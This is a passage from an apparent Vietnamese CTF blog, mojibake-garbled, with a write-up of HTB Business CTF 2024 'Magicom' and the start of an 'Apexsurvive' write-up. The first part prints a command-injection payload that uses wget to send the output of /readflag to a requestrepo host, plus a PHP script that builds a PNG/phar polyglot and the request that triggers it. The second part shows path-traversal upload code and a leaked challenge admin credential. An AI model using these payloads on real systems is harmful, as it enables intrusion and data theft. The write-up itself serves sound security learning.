cÃ¡c tham sá»‘ Ä‘Æ°á»£c truyá»n vÃ o. VÃ­ dá»¥ nhÆ° vá»›i cÃ¢u lá»‡nh cháº¡y file cli.php nhÆ° á»Ÿ trÃªn, thÃ¬ giÃ¡ trá»‹ cá»§a argv sáº½ cÃ³ dáº¡ng nhÆ° sau:\n1 2 3 4 5 6 7 8 9 Array ( [0] =\u0026gt; -c [1] =\u0026gt; /www/cli/conf.xml [2] =\u0026gt; -m [3] =\u0026gt; import [4] =\u0026gt; -f [5] =\u0026gt; /www/products.sql ) CÃ²n argc sáº½ mang giÃ¡ trá»‹ lÃ  6, á»©ng vá»›i sá»‘ tham sá»‘ truyá»n vÃ o File cÃ³ thá»ƒ gá»“m 3 tham sá»‘ truyá»n vÃ o:\n1 2 3 -c (--config): Truyá»n vÃ o Ä‘Æ°á»ng dáº«n tuyá»‡t Ä‘á»‘i Ä‘áº¿n file config á»Ÿ Ä‘á»‹nh dáº¡ng xml -m (--method): TÃªn phÆ°Æ¡ng thá»©c hÃ nh Ä‘á»™ng tÆ°Æ¡ng á»©ng, gá»“m cÃ³ import, backup vÃ  healthcheck -f (--filename): Sá»­ dá»¥ng khi dÃ¹ng method import, truyá»n vÃ o tÃªn file Ä‘á»ƒ import dá»¯ liá»‡u vÃ o database Tham sá»‘ -c khÃ¡ quan trá»ng, giÃ¡ trá»‹ nÃ y sáº½ Ä‘Æ°á»£c check xem cÃ³ pháº£i lÃ  thÆ° má»¥c hay khÃ´ng, náº¿u cÃ³ sáº½ chÃ¨n thÃªm config.xml trÆ°á»›c rá»“i return Ä‘á»‡ quy Ä‘á»ƒ tiáº¿p tá»¥c kiá»ƒm tra, tiáº¿p Ä‘Ã³ kiá»ƒm tra xem file cÃ³ tá»“n táº¡i, vÃ  file Ä‘Ã³ thÃªm .xml cÃ³ tá»“n táº¡i hay khÃ´ng, náº¿u 1 trong 2 tá»“n táº¡i thÃ¬ return vá» giÃ¡ trá»‹ Ä‘Ã³.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function isConfig($probableConfig) { if (!$probableConfig) { return null; } if (is_dir($probableConfig)) { return isConfig($probableConfig.\\DIRECTORY_SEPARATOR.\u0026#39;config.xml\u0026#39;); } if (file_exists($probableConfig)) { return $probableConfig; } if (file_exists($probableConfig.\u0026#39;.xml\u0026#39;)) { return $probableConfig.\u0026#39;.xml\u0026#39;; } return null; }; Sau khi Ä‘Ã£ xÃ¡c Ä‘á»‹nh file config cÃ³ tá»“n táº¡i, file má»›i Ä‘Æ°á»£c Ä‘Æ°a vÃ o xá»­ lÃ½:\n1 2 3 4 5 6 7 8 9 10 11 12 13 function getConfig($name) { $configFilename = isConfig(getCommandLineValue(\u0026#34;--config\u0026#34;, \u0026#34;-c\u0026#34;)); if ($configFilename) { $dbConfig = new DOMDocument(); $dbConfig-\u0026gt;load($configFilename); $var = new DOMXPath($dbConfig); foreach ($var-\u0026gt;query(\u0026#39;/config/db[@name=\u0026#34;\u0026#39;.$name.\u0026#39;\u0026#34;]\u0026#39;) as $var) { return $var-\u0026gt;getAttribute(\u0026#39;value\u0026#39;); } return null; } return null; } Sá»­ dá»¥ng DOMDocument() Ä‘á»ƒ load file config, sau Ä‘Ã³ query láº¥y giÃ¡ trá»‹ tá»« tháº» gá»‘c \u0026lt;config\u0026gt;-\u0026gt;\u0026lt;db\u0026gt;, láº¥y attribute name lÆ°u vÃ o biáº¿n $vars vÃ  láº¥y attribute value cá»§a name tÆ°Æ¡ng á»©ng. Ta cÅ©ng cÃ³ format cá»§a má»™t file config sáº½ nhÆ° tháº¿ nÃ o: 1 2 3 4 5 \u0026lt;config\u0026gt; \u0026lt;db name=\u0026#34;username\u0026#34; value=\u0026#34;root\u0026#34;/\u0026gt; \u0026lt;db name=\u0026#34;password\u0026#34; value=\u0026#34;root\u0026#34;/\u0026gt; \u0026lt;db name=\u0026#34;database\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt; \u0026lt;/config\u0026gt; HÃ m generateFilename dÃ¹ng Ä‘á»ƒ táº¡o ra tÃªn file ngáº«u nhiÃªn khi sá»­ dá»¥ng method backup:\n1 2 3 4 5 6 function generateFilename() { $timestamp = date(\u0026#34;Ymd_His\u0026#34;); $random = bin2hex(random_bytes(4)); $filename = \u0026#34;backup_$timestamp\u0026#34; . \u0026#34;_$random.sql\u0026#34;; return $filename; } =\u0026gt; Káº¿t quáº£ cho ra file sql backup vá»›i filename sá»­ dá»¥ng káº¿t há»£p ngÃ y thÃ¡ng vÃ  8 kÃ½ tá»± random\nMethod backup 1 2 3 4 function backup($filename, $username, $password, $database) { $backupdir = \u0026#34;/tmp/backup/\u0026#34;; passthruOrFail(\u0026#34;mysqldump -u$username -p$password $database \u0026gt; $backupdir$filename\u0026#34;); } Táº¡i method nÃ y, server thá»±c thi cÃ¢u lá»‡nh dump toÃ n bá»™ database vÃ o file Ä‘Æ°á»£c quy Ä‘á»‹nh trÆ°á»›c, vá»›i tÃªn filename gen random; 3 giÃ¡ trá»‹ username, password vÃ  database Ä‘Æ°á»£c láº¥y tá»« file config Method import 1 2 3 function import($filename, $username, $password, $database) { passthruOrFail(\u0026#34;mysql -u$username -p$password $database \u0026lt; $filename\u0026#34;); } Tiáº¿p tá»¥c sá»­ dá»¥ng cÃ¢u lá»‡nh há»‡ thá»‘ng Ä‘Æ°a dá»¯ liá»‡u cá»§a filename Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh vÃ o database Method healthcheck: 1 2 3 4 5 6 7 8 9 10 11 12 13 function healthCheck() { $url = \u0026#39;http://localhost:80/info\u0026#39;; $headers = get_headers($url); $responseCode = intval(substr($headers[0], 9, 3)); if ($responseCode === 200) { echo \u0026#34;[+] Daijobu\\n\u0026#34;; } else { echo \u0026#34;[-] Not Daijobu :(\\n\u0026#34;; } } HÃ m truy cáº­p Ä‘áº¿n path info dÃ¹ng Ä‘á»ƒ hiá»ƒn thá»‹ phpinfo() vÃ  láº¥y status code tráº£ vá» thÃ´ng qua header. Náº¿u 200 thÃ¬ coi lÃ  á»•n, khÃ¡c thÃ¬ bá»‹ coi lÃ  khÃ´ng á»•n =\u0026gt; Method backup vÃ  import cÃ³ kháº£ nÄƒng command injection náº¿u nhÆ° control Ä‘Æ°á»£c giÃ¡ trá»‹ trong file config. CÃ²n vá»›i option -f thÃ¬ khÃ´ng cháº¯c vÃ¬ nÃ³ cÅ©ng bá»‹ kiá»ƒm tra báº±ng file_exists nÃªn khÃ´ng thá»ƒ command injection sau filename Ä‘Æ°á»£c.\nKhai ThÃ¡c Command Injection in cli.php MÃ¬nh máº¥t má»™t lÃºc Ä‘á»ƒ nháº­n ra cÃ³ thá»ƒ truy cáº­p Ä‘áº¿n cli.php thÃ´ng qua website /cli/cli.php. NÃªn mÃ¬nh Ä‘ang nghÄ© Ä‘áº¿n command injection vÃ o cÃ¡c method, nhÆ°ng lÃ m tháº¿ nÃ o Ä‘á»ƒ bypass sá»­ dá»¥ng trÃªn command line? Äang tÃ¬m cÃ¡ch thÃ¬ teammates cá»§a mÃ¬nh phÃ¡t hiá»‡n ra táº¡i php.ini giÃ¡ trá»‹ register_argc_argv Ä‘Ã£ bá»‹ comment: GiÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c máº·c Ä‘á»‹nh lÃ  off, náº¿u nhÆ° config nÃ y Ä‘Æ°á»£c kÃ­ch hoáº¡t thÃ¬ mÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ truyá»n vÃ o giÃ¡ trá»‹ cá»§a 2 biáº¿n nÃ y thÃ´ng qua dáº¥u + thay vÃ¬ dÃ¹ng dáº¥u \u0026amp; Ä‘á»ƒ ngÄƒn cÃ¡ch. Váº­y thÃ¬ mÃ¬nh cÃ³ thá»ƒ lá»£i dá»¥ng viá»‡c nÃ y Ä‘á»ƒ truyá»n giÃ¡ trá»‹ vÃ o cÃ¡c tham sá»‘ -m vÃ  -c, thá»±c thi file cli.php nhÆ° Ä‘ang á»Ÿ command line, mÃ¬nh truy cáº­p thá»­ Ä‘áº¿n mode healthcheck thÃ¬ tháº¥y file hoÃ n toÃ n cÃ³ thá»ƒ thá»±c thi Ä‘Æ°á»£c: MÃ¬nh quyáº¿t Ä‘á»‹nh sáº½ láº¥y mode backup lÃ m sink Ä‘á»ƒ RCE, vá»›i viá»‡c sá»­ dá»¥ng DOMXPath query láº¥y dá»± liá»‡u tá»« file xml, mÃ¬nh táº¡m thá»i bá» qua viá»‡c upload file lÃªn nhÆ° nÃ o mÃ  craft má»™t file xml Ä‘á»ƒ command injection vÃ o username:\n1 2 3 4 5 \u0026lt;config\u0026gt; \u0026lt;db name=\u0026#34;username\u0026#34; value=\u0026#39;|| wget --post-data \u0026#34;$(id)\u0026#34; -O- ut8mgeo8.requestrepo.com ||\u0026#39;/\u0026gt; \u0026lt;db name=\u0026#34;password\u0026#34; value=\u0026#34;root\u0026#34;/\u0026gt; \u0026lt;db name=\u0026#34;database\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt; \u0026lt;/config\u0026gt; Äá»ƒ trÃ¡nh cÃ¢u lá»‡nh bá»‹ thá»±c thi khi echo vÃ o thÃ¬ mÃ¬nh base64 trÆ°á»›c rá»“i truyá»n vÃ o a.xml Thá»­ truyá»n vÃ o method backup vÃ  tÃªn file config lÃ : /tmp/a.xml VÃ  mÃ¬nh tháº¥y káº¿t quáº£ tráº£ vá» requestrepo, Ä‘Ã¢y lÃ  sink Ä‘Ãºng Ä‘á»ƒ cÃ³ thá»ƒ RCE: Oke váº­y lÃ  Ä‘Ã£ cÃ³ chá»— Ä‘á»ƒ RCE, váº¥n Ä‘á» cÃ²n láº¡i lÃ  upload file xml nÃ y lÃªn nhÆ° nÃ o vá»›i cÃ¡i rule whitelist kia thÃ´i.\nRace Condition?? NhÆ° mÃ¬nh Ä‘Ã£ nÃ³i á»Ÿ trÃªn, cÃ³ 2 thá»© mÃ  mÃ¬nh tháº¥y mÃ¬nh chÆ°a sá»­ dá»¥ng Ä‘Æ°á»£c trong challenge nÃ y, thá»© nháº¥t lÃ  trang phpinfo, vÃ  thá»© 2 lÃ  cÃ¡i print_r hiá»‡n thÃ´ng tin cá»§a file. Khi PHP script nháº­n Ä‘Æ°á»£c má»™t file request, file Ä‘Ã³ sáº½ Ä‘Æ°á»£c lÆ°u táº¡m thá»i trong thÆ° má»¥c /tmp vÃ  cÃ³ thá»ƒ tÃ¹y chá»‰nh trong php.ini. Trong trÆ°á»ng há»£p nÃ y sáº½ lÃ  /tmp/php+6 kÃ½ tá»± [a-zA-Z0-9]. File trong thÆ° má»¥c tmp sáº½ biáº¿n máº¥t sau khi cÃ³ sá»± xuáº¥t hiá»‡n cá»§a hÃ m move_uploaded_file hoáº·c khi PHP script Ä‘Ã³ káº¿t thÃºc. Nghe nÃ¡ nÃ¡ giá»‘ng vá»›i case LFI2RCE vá»›i phpinfo nÃªn mÃ¬nh vÃ  teammate triá»ƒn luÃ´n theo hÆ°á»›ng nÃ y. Bá»n mÃ¬nh dá»± Ä‘á»‹nh sáº½ upload file sau Ä‘Ã³ vÃ o phpinfo Ä‘á»ƒ xem Ä‘Æ°á»ng dáº«n file tmp, rá»“i sá»­ dá»¥ng mode backup Ä‘á»ƒ command injection. NhÆ°ng sau khi thá»­ ráº¥t nhiá»u láº§n khÃ´ng Ä‘Æ°á»£c, mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m hiá»ƒu kÄ© hÆ¡n vÃ  nháº­n ra mÃ¬nh Ä‘Ã£ sai vÃ  chÆ°a hiá»ƒu báº£n cháº¥t: Lá»—i LFI2RCE vá»›i phpinfo xáº£y ra khi mÃ¬nh cÃ³ thá»ƒ upload file táº¡i trang phpinfo luÃ´n, tá»©c lÃ  cÃ³ thá»ƒ sá»­ dá»¥ng POST request. PHP sáº½ lÆ°u cÃ¡c file Ä‘Æ°á»£c upload lÃªn thÆ° má»¥c temp Ä‘á»‘i vá»›i cáº£ cÃ¡c PHP script khÃ´ng há» há»— trá»£ xá»­ lÃ½ file trong nÃ³, cÃ²n á»Ÿ Ä‘Ã¢y mÃ¬nh chá»‰ cÃ³ thá»ƒ GET /info, nÃªn cÃ¡ch nÃ y coi nhÆ° tiÃªu tÃ¹ng. Ref: http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/ KhÃ´ng tá»« bá» viá»‡c race, mÃ¬nh quyáº¿t Ä‘á»‹nh Ä‘Ã¡nh vÃ o kháº£ nÄƒng print_r máº£ng vá» thÃ´ng tin file khi upload file táº¡i /addProduct, nhÆ°ng viá»‡c nÃ y cÅ©ng báº¥t kháº£ thi vÃ¬ file Ä‘Ã£ Ä‘Æ°á»£c xá»­ xong xuÃ´i háº¿t r má»›i cÃ³ response tráº£ vá» cho mÃ¬nh, mÃ¬nh Ä‘Ã£ tá»‘n 2 ngÃ y Ä‘á»ƒ thá»­ theo phÆ°Æ¡ng phÃ¡p nÃ y vÃ  khÃ´ng thu Ä‘Æ°á»£c káº¿t quáº£ gÃ¬, váº­y lÃ  challenge Ä‘Ã£ khÃ´ng thá»ƒ solve ká»‹p trÆ°á»›c khi cuá»™c thi káº¿t thÃºc :((\nThe right path: Phar Deserialization MÃ¬nh cá»© máº£i Ä‘i race mÃ  khÃ´ng nghÄ© ra DOMDocument há»— trá»£ cáº£ file phar, tÆ°Æ¡ng tá»± nhÆ° trong case XXE to Phar Deserialize khi DOMDocument-\u0026gt;loadXML cÃ³ thá»ƒ truyá»n vÃ o phar protocol thÃ¬ á»Ÿ Ä‘Ã¢y, DOMDocument-\u0026gt;load cÅ©ng cÃ³ thá»ƒ truyá»n vÃ o phar protocol -\u0026gt; +1 kiáº¿n thá»©c. ThiÃªn thá»i Ä‘á»‹a lá»£i nhÃ¢n hÃ²a, config phar.readonly cÅ©ng Ä‘Æ°á»£c táº¯t =\u0026gt; cÃ³ thá»ƒ deser file phar: Náº¿u nhÆ° Ä‘Ã£ há»— trá»£ deser phar file, thÃ¬ mÃ¬nh chá»‰ cáº§n Ä‘á»ƒ file xml cá»§a mÃ¬nh vÃ o file phar vÃ  nhÃ©t vÃ o 1 file áº£nh valid lÃ  Ä‘Æ°á»£c. Vá» cÃ¡ch gen file phar nhÆ° nÃ o thÃ¬ mÃ¬nh sáº½ lÃ m tÆ°Æ¡ng tá»± nhÆ° chall upload phar file trong root me. Ref: https://thanhlocpanda.wordpress.com/2023/08/07/php-phar-jpeg-polyglot-javascript-jpeg-polyglot-root-me-part-ii/ (pass: thanhlocpanda) ÄÆ°á»ng Ä‘i nÆ°á»›c bÆ°á»›c Ä‘Ã£ Ä‘á»§, mÃ¬nh tá»•ng há»£p láº¡i attack chain nhÆ° sau:\nGen file áº£nh cÃ ng ngáº¯n cÃ ng tá»‘t Láº¥y hex cá»§a file Ä‘Ã³, Ä‘áº¯p vÃ o file phar, chÃ¨n xml vÃ o file phar vÃ  Ä‘á»•i extension vá» áº£nh Upload file áº£nh, láº¥y Ä‘Æ°á»ng dáº«n áº£nh Gá»i Ä‘áº¿n cli.php, sá»­ dá»¥ng phar:// protocol gá»i Ä‘áº¿n file xml náº±m trong file phar =\u0026gt; RCE Final Exploit MÃ¬nh gen áº£nh 1 pixel cho nÃ³ bÃ© báº±ng Ä‘oáº¡n code:\n1 2 3 4 from PIL import Image img = Image.new(\u0026#34;RGB\u0026#34;, (1,1), (255,255,255)) img.save(\u0026#34;gen.png\u0026#34;) MÃ¬nh láº¥y hex báº±ng cyberchef vÃ  Ä‘Æ°á»£c chuá»—i:\n1 \\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x02\\x00\\x00\\x00\\x90\\x77\\x53\\xde\\x00\\x00\\x00\\x0c\\x49\\x44\\x41\\x54\\x78\\x9c\\x63\\xf8\\xff\\xff\\x3f\\x00\\x05\\xfe\\x02\\xfe\\x0d\\xef\\x46\\xb8\\x00\\x00\\x00\\x00\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82 ÄÆ°a chuá»—i vÃ o scrip gen file phar, mÃ¬nh nhÃ©t file a.xml vá»›i payload Ä‘á»c flag báº±ng /readflag vÃ o trong file phar, rá»“i Ä‘á»•i tÃªn file thÃ nh phar.png:\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php $png = \u0026#34;\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x08\\x02\\x00\\x00\\x00\\x90\\x77\\x53\\xde\\x00\\x00\\x00\\x0c\\x49\\x44\\x41\\x54\\x78\\x9c\\x63\\xf8\\xff\\xff\\x3f\\x00\\x05\\xfe\\x02\\xfe\\x0d\\xef\\x46\\xb8\\x00\\x00\\x00\\x00\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82\u0026#34;; $xml_data = \u0026#34;\u0026lt;config\u0026gt;\u0026lt;db name=\\\u0026#34;username\\\u0026#34; value=\u0026#39;|| wget --post-data \\\u0026#34;$(/readflag)\\\u0026#34; -O- ut8mgeo8.requestrepo.com ||\u0026#39;/\u0026gt;\u0026lt;db name=\\\u0026#34;password\\\u0026#34; value=\\\u0026#34;root\\\u0026#34;/\u0026gt;\u0026lt;db name=\\\u0026#34;database\\\u0026#34; value=\\\u0026#34;\\\u0026#34;/\u0026gt;\u0026lt;/config\u0026gt;\u0026#34;; $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;addFromString(\u0026#34;a.xml\u0026#34;, $xml_data); $phar-\u0026gt;setStub($png.\u0026#34;__HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;stopBuffering(); rename(\u0026#39;phar.phar\u0026#39;, \u0026#39;phar.png\u0026#39;); ?\u0026gt; Upload file phar lÃªn server thÃ nh cÃ´ng: VÃ o list product Ä‘á»ƒ láº¥y tÃªn áº£nh, cá»§a mÃ¬nh lÃ  /uploads/3e10700de9433bdb.png Request Ä‘áº¿n cli.php Ä‘á»ƒ lá»¥m flag thÃ´i:\n1 GET /cli/cli.php?-m+backup+-c+phar:///www/uploads/3e10700de9433bdb.png/a.xml ","date":"2024-05-25T21:42:04Z","permalink":"https://kev1n1203.github.io/p/htb-business-2024/","title":"HTB Business CTF 2024 Write Up - Magicom"},{"content":"Dáº¡o nÃ y mÃ¬nh khÃ¡ lÃ  hay viáº¿t wu cÃ¡c ctf challenge (cháº¯c cháº¯n khÃ´ng pháº£i lÃ  do ngÃ y trÆ°á»›c mÃ¬nh lÆ°á»i), nÃ³ dÆ°á»ng nhÆ° Ä‘Ã£ táº¡o cho mÃ¬nh thÃ³i quen hÃ ng tuáº§n mÃ¬nh sáº½ wu láº¡i nhá»¯ng challenge mÃ¬nh chÆ¡i vÃ  mÃ¬nh tháº¥y hay vÃ  há»c Ä‘Æ°á»£c nhiá»u thá»© tá»« nÃ³. CÃ¢u láº¡c bá»™ mÃ¬nh tuáº§n nÃ y cÃ³ tham gia giáº£i HTB - Cyber Apocalypse 2024, pháº£i cÃ´ng nháº­n Ä‘Ã¢y lÃ  má»™t giáº£i dÃ i hÆ¡i vÃ  mÃ¬nh Ä‘Ã£ tá»‘n tÆ°Æ¡ng Ä‘á»‘i thá»i gian cho cÃ¡c challenge web cá»§a giáº£i nÃ y (cá»¥ thá»ƒ lÃ  4 ngÃ y) nhÆ°ng váº«n khÃ´ng thá»ƒ solve Ä‘Æ°á»£c háº¿t web challenge cá»§a giáº£i, báº£n thÃ¢n mÃ¬nh cÃ²n pháº£i há»c há»i ráº¥t nhiá»u ná»¯a má»›i cÃ³ thá»ƒ hiá»ƒu vÃ  solve Ä‘Æ°á»£c dáº¡ng bÃ i web cuá»‘i cÃ¹ng náº¿u láº§n sau cÃ²n gáº·p láº¡i. Giáº£i Ä‘Ã£ káº¿t thÃºc vÃ  cÅ©ng nhá» sá»± cá»‘ gáº¯ng, try hard cá»§a cÃ¡c anh em trong cÃ¢u láº¡c bá»™ Ä‘áº¿n tá»« má»i máº£ng mÃ  clb mÃ¬nh cÅ©ng Ä‘áº¡t Ä‘Æ°á»£c thá»© háº¡ng mÃ¬nh nghÄ© lÃ  khÃ¡ cao , hehe. Lan man váº­y cÅ©ng Ä‘á»§ rá»“i, sau Ä‘Ã¢y sáº½ lÃ  quÃ¡ trÃ¬nh mÃ¬nh vÃ  cÃ¡c teamates trong KCSC Ä‘i giáº£i cÃ¡c challenge web HTB, cÅ©ng nhÆ° cÃ¡ch hiá»ƒu cá»§a mÃ¬nh vá» web chall Ä‘Ã³. Let\u0026rsquo;s go!!\nApexsurvive Preface ÄÃ¢y lÃ  má»™t chall white box nÃªn mÃ¬nh download source vá» rá»“i dá»±ng local khai thÃ¡c cho nÃ³ tiá»‡n theo dÃµi, hehe :\u0026quot;))) Sau khi dá»±ng xong thÃ¬ mÃ¬nh cÅ©ng pháº£i khÃ¡ choÃ¡ng vÃ¬ dockerfile cá»§a bÃ i nÃ y nhá»¯ng 70 dÃ²ng, nÃªn mÃ¬nh tÃ² mÃ² Ä‘á»c Ä‘á»ƒ náº¯m trÆ°á»›c cáº§n pháº£i lÃ m gÃ¬ á»Ÿ chall nÃ y\n1 2 3 4 5 6 7 # Setup flag COPY flag.txt /root/flag RUN chmod 600 /root/flag # Setup readflag COPY config/readflag.c / RUN gcc -o /readflag /readflag.c \u0026amp;\u0026amp; chmod 4755 /readflag \u0026amp;\u0026amp; rm /readflag.c Docker nhÆ° nÃ y lÃ  mÃ¬nh pháº£i RCE Ä‘á»ƒ láº¥y flag rÃ¹i Chall cÃ³ 2 service, 1 service web chÃ­nh cháº¡y python, vÃ  service email cháº¡y js (vÃ  bot), nÃªn mÃ¬nh nghÄ© cháº¯c sáº½ cÃ³ cáº£ lá»— há»•ng client side vÃ  server side trong challenge nÃ y\nVerify email token VÃ o chall thÃ¬ mÃ¬nh Ä‘Æ°á»£c \u0026lsquo;hÆ°á»›ng dáº«n\u0026rsquo; Ä‘Äƒng kÃ­ vá»›i tÃªn test@email.htb vÃ  Ä‘á»ƒ nháº­n Ä‘Æ°á»£c token email verify, nÃªn cÅ©ng nhanh nháº£u register vÃ  nháº­n Ä‘Æ°á»£c token á»Ÿ endpoint /email khi Ä‘Ã£ vÃ o account settings vÃ  chá»n verify: Sau khi verify mÃ¬nh tháº¥y cÃ³ chá»©c nÄƒng report vÃ  tham sá»‘ truyá»n vÃ o lÃ  ID cá»§a sáº£n pháº©m cÃ³ táº¡i /challenge/home(nghe mÃ¹i xss quÃ¡) Äi vÃ o Ä‘á»c source, mÃ¬nh tháº¥y cÃ³ endpoint /eternal khÃ¡ hay khi cho phÃ©p redirect Ä‘áº¿n endpoint mÃ¬nh control:\n1 2 3 4 5 6 7 8 @web.route(\u0026#39;/external\u0026#39;) def external(): url = request.args.get(\u0026#39;url\u0026#39;, \u0026#39;\u0026#39;) if not url: return redirect(\u0026#39;/\u0026#39;) return redirect(url) Vá»›i viá»‡c cookie Ä‘Æ°á»£c set samesite: strict, mÃ¬nh nghÄ© Ä‘áº¿n viá»‡c bypass Samesite Strict báº±ng redirect nÃªn Ä‘Ã£ ngá»“i vá»›i tháº±ng nÃ y cáº£ buá»•i nhÆ°ng khÃ´ng cÃ³ káº¿t quáº£ :cry:\nMÃ² máº«m source code Sau khi tá»‘n kha khÃ¡ thá»i gian vá»›i tháº±ng endpoint nÃ y mÃ  khÃ´ng Ä‘Æ°á»£c káº¿t quáº£ gÃ¬, mÃ¬nh quyáº¿t Ä‘á»‹nh táº¡m thá»i bá» qua vÃ  hÆ°á»›ng Ä‘áº¿n cÃ¡c chá»©c nÄƒng khÃ¡c, cÃ³ 2 chá»©c nÄƒng Ä‘Ã¡ng chÃº Ã½ khi mÃ¬nh cÃ³ thá»ƒ lÃªn Ä‘Æ°á»£c admin, Ä‘Ã³ lÃ  thÃªm sáº£n pháº©m/addItem vÃ  thÃªm contract/addContract.\nChá»©c nÄƒng thÃªm sáº£n pháº©m cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng khi mÃ¬nh thá»a mÃ£n isInternal (cá»¥ thá»ƒ lÃ  thuá»™c tÃ­nh isInternal cá»§a user trong db lÃ  true) thÃ¬ cÃ³ thá»ƒ sá»­ dá»¥ng, addItem dÃ¹ng Ä‘á»ƒ thÃªm má»™t sáº£n pháº©m má»›i vÃ o shop. Tuy nhiÃªn thÃ¬ cÃ¡c input cÅ©ng Ä‘Ã£ Ä‘Æ°á»£c sanitize chá»‰ cho phÃ©p nháº­p vÃ o cÃ¡c tag vÃ  attribute nháº¥t Ä‘á»‹nh Ä‘Æ°á»£c quy Ä‘á»‹nh trong middlewares.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 @api.route(\u0026#39;/addItem\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) @isAuthenticated @isVerified @isInternal @antiCSRF @sanitizeInput def addItem(decodedToken): name = request.form.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) price = request.form.get(\u0026#39;price\u0026#39;, \u0026#39;\u0026#39;) description = request.form.get(\u0026#39;description\u0026#39;, \u0026#39;\u0026#39;) image = request.form.get(\u0026#39;imageURL\u0026#39;, \u0026#39;\u0026#39;) note = request.form.get(\u0026#39;note\u0026#39;, \u0026#39;\u0026#39;) seller = request.form.get(\u0026#39;seller\u0026#39;, \u0026#39;\u0026#39;) if any(value == \u0026#39;\u0026#39; for value in [name, price, description, image, note, seller]): return response(\u0026#39;All fields are required!\u0026#39;), 401 newProduct = addProduct(name, image, description, price, seller, note) if newProduct: return response(\u0026#39;Product Added\u0026#39;) return response(\u0026#39;Something went wrong!\u0026#39;) Chá»©c nÄƒng mÃ¬nh muá»‘n nÃ³i Ä‘áº¿n thÃªm contract, khi upload 1 file lÃªn, server lÆ°u ná»™i dung vÃ o /tmp/temporaryUpload rá»“i má»›i check ná»™i dung cá»§a file Ä‘Ã³ á»Ÿ hÃ m checkPDF sá»­ dá»¥ng PdfReader mode strict (khÃ³ cá»©u ca nÃ y). Náº¿u check thÃ nh cÃ´ng sáº½ ná»‘i /app/application, contracts vÃ  file name báº±ng os.path.join Ä‘á»ƒ táº¡o thÃ nh file path hoÃ n chá»‰nh. HÃ m path.join dÃ­nh path traversal náº·ng vÃ  Ä‘Ã¢y lÃ  lá»—i mÃ¬nh cáº§n khai thÃ¡c Ä‘á»ƒ exploit path traversal upload file to RCE. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 @api.route(\u0026#39;/addContract\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) @isAuthenticated @isVerified @isInternal @isAdmin @antiCSRF @sanitizeInput def addContract(decodedToken): name = request.form.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) uploadedFile = request.files[\u0026#39;file\u0026#39;] if not uploadedFile or not name: return response(\u0026#39;All files required!\u0026#39;) if uploadedFile.filename == \u0026#39;\u0026#39;: return response(\u0026#39;Invalid file!\u0026#39;) uploadedFile.save(\u0026#39;/tmp/temporaryUpload\u0026#39;) isValidPDF = checkPDF() if isValidPDF: try: filePath = os.path.join(current_app.root_path, \u0026#39;contracts\u0026#39;, uploadedFile.filename) with open(filePath, \u0026#39;wb\u0026#39;) as wf: with open(\u0026#39;/tmp/temporaryUpload\u0026#39;, \u0026#39;rb\u0026#39;) as fr: wf.write(fr.read()) return response(\u0026#39;Contract Added\u0026#39;) except Exception as e: print(e, file=sys.stdout) return response(\u0026#39;Something went wrong!\u0026#39;) return response(\u0026#39;Invalid PDF! what are you trying to do?\u0026#39;) Buá»“n á»Ÿ chá»— chá»©c nÄƒng nÃ y khÃ´ng dá»… cÃ³ tÃ­ nÃ o vÃ¬ pháº£i lÃ  admin thÃ¬ má»›i sá»­ dá»¥ng Ä‘Æ°á»£c, bÃ i toÃ¡n lÃºc nÃ y láº¡i quay vá» viá»‡c lÃ m tháº¿ nÃ o Ä‘á»ƒ lÃªn Ä‘Æ°á»£c admin Tiáº¿p tá»¥c Ä‘á»c source, mÃ¬nh ngá»‘n khoáº£ng 1 buá»•i tiáº¿p theo Ä‘á»ƒ nghÄ© cÃ¡ch bypass admin nhÆ°ng cháº³ng cÃ³ cÃ¡ch nÃ o kháº£ thi, cÅ©ng may lÃ  cuá»™c thi kÃ©o dÃ i nhiá»u ngÃ y nÃªn mÃ¬nh cÃ³ nhiá»u thá»i gian suy nghÄ© hÆ¡n. LÃºc nÃ y mÃ¬nh Ä‘Ã£ chá»‹u vÃ  khÃ´ng tÃ¬m Ä‘Æ°á»£c cÃ¡ch leo lÃªn admin, nhÆ°ng láº¡i biáº¿t Ä‘Æ°á»£c vuln sau khi lÃªn admin (aizzz chÃ­c tá»‹c). Nháº­n tháº¥y chá»©c nÄƒng report sáº½ láº¥y credential cá»§a admin vÃ  gá»­i Ä‘i nÃªn mÃ¬nh sá»­ dá»¥ng chÃºng Ä‘Äƒng nháº­p vÃ o admin exploit lá»—i upload file, cÃ¡c teammates sáº½ lo vá»¥ leo lÃªn admin :laughing:\n1 2024-03-16 22:34:49 127.0.0.1 - - [16/Mar/2024 15:34:49] \u0026#34;GET /visit?productID=1\u0026amp;email=xclow3n@apexsurvive.htb\u0026amp;password=d8Bfk5Fw6oiROrxqrS2TmLc4NF1ZHU3r0OQfZSzbHna2DGljQbEmNG6st7uZ9QQ7 HTTP/1.1\u0026#34; 200 - Exploit file upload NÃ³i 